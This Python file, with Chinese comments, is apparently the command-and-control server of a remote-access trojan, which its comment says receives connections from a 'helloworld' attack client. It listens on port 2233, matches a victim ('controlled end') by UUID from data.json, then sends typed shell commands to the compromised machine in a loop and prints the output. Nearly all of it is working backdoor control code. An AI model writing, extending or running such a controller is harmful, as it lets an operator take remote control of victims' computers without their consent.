import time
import socket
# 用于接应helloworld攻击客户端的服务模块
import json

def core_socket(idd):
	host = ""
	port = 2233
	sock = socket.socket()
	sock.bind((host, port))
	sock.listen(5)
	cli, addr = sock.accept()
	print("\n\n客户端接入！")
	print(addr)

	#接收模式识别
	mod = cli.recv(2048).decode()

	if mod == "heart":
		cli.sendall("my".encode())
		print("被控端接入！")
		uuid = cli.recv(2048).decode()
		print("收到：" + uuid)

		if idd == uuid:
			print("匹配成功，成功捕获")
			cli.sendall("start".encode())
			print(cli.recv(2048).decode())

			while True:
				cmd = input(">>")
				cli.sendall(cmd.encode())
				print(cli.recv(2048).decode().split('thisisafengefu'))

		else:
			cli.sendall("stop".encode())



def write(data):
	with open("data.json",'w') as ojbk:
		json.dump(data,ojbk)  

def read():
	with open("data.json") as zx:
		data = json.load(zx)
	return data

def main():
	data = read()
	for uuid, time in data.items():
		print("id:"+uuid+" time:" + time)

	a = input("id>>")

	while True:
		core_socket(a)


main()
	
			
